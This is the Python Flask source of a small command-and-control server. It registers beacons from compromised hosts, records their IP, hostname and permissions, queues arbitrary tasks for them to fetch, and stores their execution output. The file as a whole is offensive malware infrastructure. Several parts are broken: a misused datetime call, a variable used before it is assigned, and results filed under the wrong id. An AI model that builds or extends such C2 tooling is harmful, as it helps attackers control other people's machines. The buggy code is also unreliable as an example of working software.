from flask import Flask, request, jsonify
from time import time
import ssl
import os
from Classes import *
from werkzeug.exceptions import BadRequest
import uuid
from database import db, Beacon, Task, Result
import datetime

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
db.init_app(app)

with app.app_context():
    db.create_all()


# remove this later
db_name = "monke"
db_id = "1"
db_key = "xyz"
db_config = "10"

agents = Agent(
    name=db_name,
    id=db_id,
    key=db_key,
    path=f"/home/exe/agents/{db_name.lower()}",     # Remove this later
    config=db_config
)


def initial_setup():
    base_data_path = "/home/exe/data"
    subdirectories = ["logs", "test1", "test2"]         # Review the placeholder

    if not os.path.exists(base_data_path):
        os.makedirs(base_data_path)

        for subdir in subdirectories:
            full_path = os.path.join(base_data_path, subdir)
            os.makedirs(full_path, exist_ok=True)
            print(f"[+] Created directories: {full_path}")


@app.route("/")
def web_root():
    return "<p>Hello!</p>"

# Works 
@app.route("/c2/register_beacon", methods=['POST'])
def register_beacon_route():
    try:
        data = request.json
        if not data:
            raise BadRequest("No JSON data provided")  

        remote_ip = data.get('IP')
        remote_hostname = data.get('Hostname')
        current_permission = data.get('Permissions')
        beacon_id = data.get('Beacon ID')

        if not all([remote_ip, remote_hostname]):
            return jsonify(f"Failed \n {request.json} "), 400
        
        new_beacon = Beacon(
            id=beacon_id,
            ip=remote_ip,
            hostname=remote_hostname,
            permissions=current_permission
        )
        db.session.add(new_beacon)
        db.session.commit()

        return jsonify({
            "status": "success",
            "message": "Beacon registered successfully",
            "data": {"beacon_id": beacon_id}
        }), 200

    except BadRequest as e:
        return jsonify({"status": "failure", "message": f"Invalid JSON data: {str(e)}", "data": {}}), 400
    except Exception as e:
        return jsonify({"status": "failure", "message": f"Error: {str(e)}", "data": {}}), 500


# something off
@app.route("/c2/read_task", methods=['GET'])
def read_task_route():
    beacon_id = request.args.get('beacon_id')

    if not beacon_id:
        return jsonify({"status": "failure", "message": "Beacon ID is missing", "data": {}}), 400

    # Check if the beacon exists
    beacon = Beacon.query.filter_by(id=beacon_id).first()
    if not beacon:
        return jsonify({"status": "failure", "message": "Invalid beacon ID", "data": {}}), 404

    # Get the juice
    tasks = Task.query.filter_by(beacon_id=beacon_id).all()
    task_list = [task.task for task in tasks]

    return jsonify({
        "status": "success",
        "message": "Tasks fetched successfully",
        "data": {"tasks": task_list}
    }), 200

# Works
@app.route("/c2/write_task", methods=['POST'])
def write_task_route():
    try:
        data = request.json
        if not data:
            return jsonify({"status": "failure", "message": "No JSON data provided", "data": {}}), 400

        beacon_id = data.get('beacon_id')
        task_content = data.get('task')

        if not beacon_id or not task_content:
            return jsonify({"status": "failure", "message": "Beacon ID or task is missing", "data": {}}), 400

        # Check if the beacon exists 
        beacon = Beacon.query.filter_by(id=beacon_id).first()
        if not beacon:
            return jsonify({"status": "failure", "message": "Invalid beacon ID", "data": {}}), 404

        # Create a new task and save it to the database
        task_id = str(uuid.uuid4())
        new_task = Task(
            task_id=task_id,
            beacon_id=beacon_id,
            task=task_content,
            status="pending"
        )
        db.session.add(new_task)
        db.session.commit()

        return jsonify({
            "status": "success",
            "message": "Task assigned successfully",
            "data": {"task_id": task_id}
        }), 200

    except Exception as e:
        return jsonify({"status": "failure", "message": f"Failed to assign task: {str(e)}", "data": {}}), 500

# Hmmmmmmmm data is wrong
@app.route("/c2/return_beacon_data", methods=['POST'])
def return_execution_data():
    try:
        data = request.json
        if not data:
            return jsonify({"status": "failure", "message": "No JSON data provided", "data": {}}), 400

        beacon_id = data.get('beacon_id')
        output = data.get('output')

        if not beacon_id or not output:
            return jsonify({"status": "failure", "message": "Beacon ID or output is missing", "data": {}}), 400

        # Check if the beacon exists 
        beacon = Beacon.query.filter_by(id=beacon_id).first()
        if not beacon:
            return jsonify({"status": "failure", "message": "Invalid beacon ID", "data": {}}), 404

        # Create a new result and save it to the database
        result_id = str(uuid.uuid4())
        new_result = Result(
            result_id=result_id,
            task_id=beacon_id,
            output=output
        )
        db.session.add(new_result)
        db.session.commit()

        # Update the task status 
        task = Task.query.filter_by(task_id=beacon_id).first()
        if task:
            task.status = "completed"
            task.completed_at = datetime.utcnow()
            db.session.commit()


        return jsonify({
            "status": "success",
            "message": "Result saved successfully",
            "data": {"result_id": result_id}
        }), 200

    except Exception as e:
        return jsonify({"status": "failure", "message": f"Failed to save result: {str(e)}", "data": {}}), 500
    

#################################################

@app.route("/database/clear_beacons", methods=['POST'])
def clear_beacons_db():
    data = request.json
    if not data:
        return jsonify({"status": "failure", "message": "No JSON data provided", "data": {}}), 400
    
    beacon_ids = data.get('beacon_id')
    if not beacon_id:
        return jsonify({"status": "failure", "message": "Beacon ID not provided", "data": {}}), 400

    for beacon_id in beacon_ids:
        beacon = Beacon.query.filter_by(id=beacon_id).first()
        if not beacon:
            return jsonify({"status": "failure", "message": "Invalid beacon ID", "data": {}}), 404

        # boom
        db.session.delete(beacon)
        db.session.query(Task).filter_by(beacon_id=beacon_id).delete()
        db.session.commit()

    return jsonify({"status": "success", "message": "Beacondeleted successfully", "data": {}}), 200



"""
@app.route("/c2/write_pi_task", methods=['GET'])
def write_pi_task():
    pass


@app.route("/c2/return_pi_execution_data", methods=['POST'])
def return_pi_execution_data():
    pass


@app.route("/c2/pi_video_feed")
def video_feed():
    pass
"""
##################################################





if __name__ == '__main__':
    initial_setup()
    debug = True
    app.run(host='0.0.0.0', port=80)

